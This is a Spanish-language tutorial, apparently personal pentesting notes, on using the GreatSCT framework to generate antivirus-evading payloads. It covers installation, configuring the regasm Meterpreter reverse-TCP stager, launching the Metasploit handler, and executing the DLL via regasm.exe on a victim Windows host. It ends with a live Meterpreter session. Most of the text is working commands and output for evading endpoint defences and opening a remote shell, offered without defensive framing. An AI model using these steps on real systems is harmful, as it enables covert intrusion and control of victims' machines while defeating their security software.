---
icon: ghost
---

# Evasión con GreatSCT

En este caso vamos a ver una herramienta de `GitHub` que se utilizar para generar `payloads` para poder evadir los antivirus o las herramientas de seguridad que se denomina `GreatSCT`:

URL = [GreatSCT GitHub](https://github.com/GreatSCT/GreatSCT)

Esta herramienta se puede generar `payloads` que son compatibles con `metasploit`, tambien son compatibles con diferentes herramientas de un sistema operativo `Windows` que es lo mas interesante.

Para instalarla nos tendremos que clonar el repositorio de la siguiente forma:

```shell
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
```

Esto puede tardar un rato, a lo largo de la instalacion nos apareceran algunas pestañas, a primera de ellas le daremos a `ENTER`(`no`) -> `TAB` -> `ENTER`(`Ok`).

Despues nos aparecera una ventanita en la que tendremos que darle a `Ok` y continuara la instalacion.

Info:

```
........................................

[*] Ensuring this account (kali) owns GreatSCT output directory (/usr/share/greatsct-output)...
 [*] Ensuring this account (kali) has correct ownership of /home/kali/.greatsct

 [I] Done!
```

Cuando veamos que ha terminado, vamos arrancar la aplicacion de la siguiente forma:

```shell
sudo ../GreatSCT.py
```

Info:

```
===============================================================================
                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

Main Menu

        0 tools loaded

Available Commands:

        exit                    Exit GreatSCT
        info                    Information on a specific tool
        list                    List available tools
        update                  Update GreatSCT
        use                     Use a specific tool

Main menu choice:
```

Veremos esto, pero vemos que no tenemos cargada ninguna herramienta, por lo que tendremos que generar un fichero de configuracion antes de la siguiente forma:

```shell
cd ../config
sudo python3 update.py
```

Info:

```
Great Scott configuration:

 [*] OPERATING_SYSTEM = Kali
 [*] TERMINAL_CLEAR = clear
 [*] WINEPREFIX = /home/kali/.greatsct/
 [*] TEMP_DIR = /tmp/
 [*] MSFVENOM_OPTIONS = 
 [*] METASPLOIT_PATH = /usr/share/metasploit-framework
 [*] MSFVENOM_PATH = /usr/share/metasploit-framework
 [*] GREATSCT_BYPASS_PATH = /home/kali/GreatSCT/
 [*] PAYLOAD_SOURCE_PATH = /usr/share/greatsct-output/source/
 [*] PAYLOAD_COMPILED_PATH = /usr/share/greatsct-output/compiled/
 [*] GENERATE_HANDLER_SCRIPT = True
 [*] HANDLER_PATH = /usr/share/greatsct-output/handlers/
 [*] HASH_LIST = /usr/share/greatsct-output/hashes.txt

 Configuration File Written To '/etc/greatsct/settings.py'
```

Ahora si nos vamos hacia atras y volvemos a ejecutar la herramienta:

```shell
cd ..
sudo ./GreatSCT.py
```

Info:

```
===============================================================================
                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

Main Menu

        1 tools loaded

Available Commands:

        exit                    Exit GreatSCT
        info                    Information on a specific tool
        list                    List available tools
        update                  Update GreatSCT
        use                     Use a specific tool

Main menu choice:
```

Vemos que ahora si tendremos cargada una herramienta y si ponemos el comando `list` podremos verla:

```shell
list
```

Info:

```
===============================================================================
                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Available Tools:

        1)      Bypass

Main menu choice:
```

Veremos que es la de `Bypass`, para utilizarla pondremos lo siguiente:

```shell
use 1
```

Info:

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

GreatSCT-Bypass Menu

        26 payloads loaded

Available Commands:

        back                    Go to main GreatSCT menu
        checkvt                 Check virustotal against generated hashes
        clean                   Remove generated artifacts
        exit                    Exit GreatSCT
        info                    Information on a specific payload
        list                    List available payloads
        use                     Use a specific payload

GreatSCT-Bypass command:
```

Veremos que al utilizar esa herramienta nos carga `26` `payloads`, si hacemos un `list` podremos ver todos los `payloads` que nos ha cargado, todos estos `payloads` tienen que ver con diferentes herramientas propias del `S.O.` `Windows` que despues va a utilizar para ejecutarlos, pueden haber algunos que lo detecte el antivirus y otros que no, pero vamos a ver los que no son detectados por el `antivirus`.

Vamos a probar a utilizar el numero `16` que utiliza `regasm` para ejecutar una `shell reversa`, para saber mas informacion de la herramienta de `Windows` `regasm.exe` estara en el siguiente link:

URL = [regasm.exe Microsoft Info](https://learn.microsoft.com/es-es/dotnet/framework/tools/regasm-exe-assembly-registration-tool)

Vamos a seleccionar el `payload` numero `16`:

```shell
use 16
```

Info:

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 Payload information:

        Name:           Pure InstallUtil C# Reverse TCP Stager
        Language:       regasm
        Rating:         Excellent
        Description:    pure regasm windows/meterpreter/reverse_tcp stager

Payload: regasm/meterpreter/rev_tcp selected

Required Options:

Name                    Value           Description
----                    -----           -----------
COMPILE_TO_DLL          Y               Compile to a DLL
DEBUGGER                X               Optional: Check if debugger is attached
DOMAIN                  X               Optional: Required internal domain
EXPIRE_PAYLOAD          X               Optional: Payloads expire after "Y" days
HOSTNAME                X               Optional: Required system hostname
INJECT_METHOD           Heap            Virtual or Heap
LHOST                                   IP of the Metasploit handler
LPORT                   4444            Port of the Metasploit handler
PROCESSORS              X               Optional: Minimum number of processors
SLEEP                   X               Optional: Sleep "Y" seconds, check if accelerated
TIMEZONE                X               Optional: Check to validate not in UTC
USERNAME                X               Optional: The required user account

 Available Commands:

        back            Go back
        exit            Completely exit GreatSCT
        generate        Generate the payload
        options         Show the shellcode's options
        set             Set shellcode option

[regasm/meterpreter/rev_tcp>>]
```

Y como veremos es una interfaz parecida a la de `metasploit` en la que podremos configurar el `payload` a nuestras necesidades.

```shell
set lhost 192.168.5.205
set lport 7777
generate
<ENTER>
```

Info:

```
===============================================================================
                                   Great Scott!
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

 [*] Language: regasm
 [*] Payload Module: regasm/meterpreter/rev_tcp
 [*] DLL written to: /usr/share/greatsct-output/compiled/payload.dll
 [*] Source code written to: /usr/share/greatsct-output/source/payload.cs
 [*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
 [*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/payload.rc

Please press enter to continue >:
```

Aqui nos dice la informacion de como se va a formar ese `payload` y que tendremos que configurar, en la parte de `DLL written to` nos comenta que esta `.dll` la tendremos que mover a `Windows`, despues `Source code written to` aqui nos dice que tendremos que ejecutar esto para que funcione y por ultimo en esta parte `Metasploit RC file written to` nos comenta que tenemos un `handler` en `metasploit` configurado para ejecutar y estar a la escucha de forma automatica, por lo que haremos lo siguiente en otra terminal.

```shell
msfconsole -q -r /usr/share/greatsct-output/handlers/payload.rc
```

Info:

```
[*] Processing /usr/share/greatsct-output/handlers/payload.rc for ERB directives.
resource (/usr/share/greatsct-output/handlers/payload.rc)> use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
resource (/usr/share/greatsct-output/handlers/payload.rc)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/usr/share/greatsct-output/handlers/payload.rc)> set LHOST 192.168.5.205
LHOST => 192.168.5.205
resource (/usr/share/greatsct-output/handlers/payload.rc)> set LPORT 7777
LPORT => 7777
resource (/usr/share/greatsct-output/handlers/payload.rc)> set ExitOnSession false
ExitOnSession => false
resource (/usr/share/greatsct-output/handlers/payload.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.5.205:7777
```

Ahora en otra terminal nos copiaremos el `.dll` de la siguiente forma:

```shell
cp /usr/share/greatsct-output/compiled/payload.dll ~/Desktop
```

Ahora tendremos que pasar ese `payload.dll` a la maquina `Windows`, veremos que cuando nos la pasamos no salta el `antivirus`, por lo que ahora tendremos que ejecutar este comando en una consola de `PowerShell` en la maquina `Windows` victima:

```powershell
cd Desktop
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U payload.dll
```

Info:

```
Utilidad de registro de ensamblados de Microsoft .NET Framework versión 4.8.9037.0
para Microsoft .NET Framework versión 4.8.9037.0
Copyright (C) Microsoft Corporation. Todos los derechos reservados.
```

Se nos quedara pensando y si nos vamos a donde tenemos la escucha en `metasploit` veremos lo siguiente:

```
[*] Sending stage (177734 bytes) to 192.168.5.209
[*] Meterpreter session 1 opened (192.168.5.205:7777 -> 192.168.5.209:63326) at 2025-02-07 05:22:22 -0500
```

Vemos que se nos ha creado una conexion `reversa` con la maquina `Windows` victima.

Para conectarnos haremos lo siguiente:

```shell
sessions
```

Info:

```
Active sessions
===============

  Id  Name  Type                     Information            Connection
  --  ----  ----                     -----------            ----------
  1         meterpreter x86/windows  CORP\empleado2 @ WS02  192.168.5.205:7777 -> 192.168.5.209:63326 (192.168.5.209)
```

Ahora nos conectamos a la sesion numero `1`:

```shell
sessions 1
```

Info:

```
[*] Starting interaction with 1...

meterpreter > getuid
Server username: CORP\empleado2
```

Y ya veremos que podremos ejecutar comandos mediante un `meterpreter`.

Tambien podremos utilizar otros `payloads` como por ejemplo el de la herramienta `regsvcs` la del numero `22`, que tampoco seria detectado por un `antivirus` y solo tendremos que seguir el mismo proceso que el anterior.
